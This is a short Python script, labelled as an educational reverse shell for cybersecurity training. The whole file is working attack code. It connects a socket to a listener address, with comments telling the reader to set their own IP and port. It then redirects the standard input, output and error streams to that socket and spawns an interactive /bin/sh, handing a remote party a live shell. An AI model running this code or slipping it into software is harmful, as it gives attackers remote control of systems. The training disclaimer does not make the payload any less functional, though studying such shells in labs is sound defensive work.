# Educational Python Reverse Shell
# For cybersecurity training purposes only
import socket,subprocess,os
host = '127.0.0.1'  # Change to your listener IP
port = 4444         # Change to your listener port
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(['/bin/sh','-i'])
